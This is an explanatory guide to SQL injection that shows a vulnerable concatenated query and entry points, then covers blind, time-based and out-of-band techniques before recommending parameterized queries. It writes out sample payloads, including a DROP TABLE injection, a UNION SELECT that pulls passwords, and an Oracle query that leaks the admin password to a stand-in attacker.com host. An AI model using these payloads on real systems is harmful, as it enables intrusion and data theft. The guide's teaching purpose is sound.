SQL injection is possible whenever an application takes **untrusted user input** and mistakenly treats it as **executable code** rather than just text data. This typically happens at the layer where the application constructs a SQL query string.

Here are the most common technical scenarios that trigger this vulnerability.

---

### 1. The Classic Mistake: Direct String Concatenation

This is the root cause behind the overwhelming majority of SQL injection flaws. The developer builds a SQL command by gluing together hardcoded strings with variables taken directly from user input.

**The Vulnerable Pattern (Pseudocode):**
```python
# WARNING: Never do this.
user_id = request.GET['id']
sql = "SELECT * FROM Accounts WHERE UserID = " + user_id
cursor.execute(sql)
```

If an attacker provides `1; DROP TABLE Accounts; --` as the `id`, the resulting string sent to the database becomes two separate commands: a harmless select, followed by a table-destroying drop.

---

### 2. Where the Malicious Input Enters the System (Attack Vectors)

You might wonder where an attacker actually *types* these dangerous strings. It’s any channel the application consumes data from, not just visible web forms.

| Vector | How It Triggers | Real-World Example |
| :--- | :--- | :--- |
| **Web Page Input Fields** | User input in a login box, search bar, or comment field is pasted directly into a query. | Typing `' OR 1=1 --` in a username field on a poorly coded login page. |
| **URL Query Strings / HTTP Headers** | The application reads parameters from the URL or HTTP headers (like `User-Agent` or `Cookie`) and uses them in a query without sanitization. | A URL like `products.php?category=books` is altered to `products.php?category=books' UNION SELECT username, password FROM Users--`. |
| **Second-Order (Stored) Injection** | The attacker’s malicious input is stored in the database first (e.g., as a user profile name), and the exploit triggers *later* when that stored data is used in another query. | An attacker creates an account with the username `admin'--`. When an admin module later runs `SELECT * FROM Users WHERE Name = '` + storedName `'`, it changes the logic of the query. |

---

### 3. Beyond the Basic Quote: Blind Injection

Sometimes an attacker can't see the results on the screen, but they can still exfiltrate data or cause damage by observing the application's behavior. This makes the SQL injection no less dangerous. Two common techniques are used to trigger it:

- **Boolean-Based:** The attacker doesn't get raw data back but can tell if a condition is true or false. They basically play 20 Questions with the database.
    - **Input:** `1 AND 1=1` — the page loads normally (True).
    - **Input:** `1 AND 1=2` — the page returns a different result or breaks (False).
    - Using this on/off signal, they can ask: `1 AND (SELECT SUBSTRING(Password, 1, 1) FROM Users WHERE Name = 'admin') = 'a'`. If the page loads, they know the admin password starts with 'a'.

- **Time-Based:** If the page behavior doesn't visibly change, the attacker can instruct the database to pause.
    - **Input:** `1; IF (condition is true) WAITFOR DELAY '00:00:05'--`. If the server takes exactly 5 seconds to respond, the attacker knows their condition was true, slowly mapping out the data character by character.

---

### 4. Exploiting No Visible Feedback (Out-of-Band)

This is used when the application is a true black box and neither a visual nor a time delay can be observed by the attacker. The trigger here forces the database server itself to make a connection back out to the attacker's server, exfiltrating data through DNS or HTTPS.

- **Trigger:** An attacker injects a command that makes the database look up a web address controlled by the attacker.
- **Example (Oracle):**
    ```sql
    SELECT DBMS_LDAP.INIT((SELECT Password FROM Users WHERE Username='admin')||'.attacker.com',80) FROM DUAL;
    ```
    Here, the database is tricked into trying to connect to `AdminPassword.attacker.com`. The attacker simply checks their server logs and sees the password in the DNS request.

---

### The Underlying Enabler: Treating Data as Code

All these triggers share a single, critical failure: **the application does not separate code (the SQL statement's structure) from data (the user's input).**

Parameterized queries solve this by pre-compiling the SQL statement's logic, so user input can only ever be inserted as a literal value at a clearly defined placeholder. The database then knows exactly where the code ends and the data begins, making injection structurally impossible.
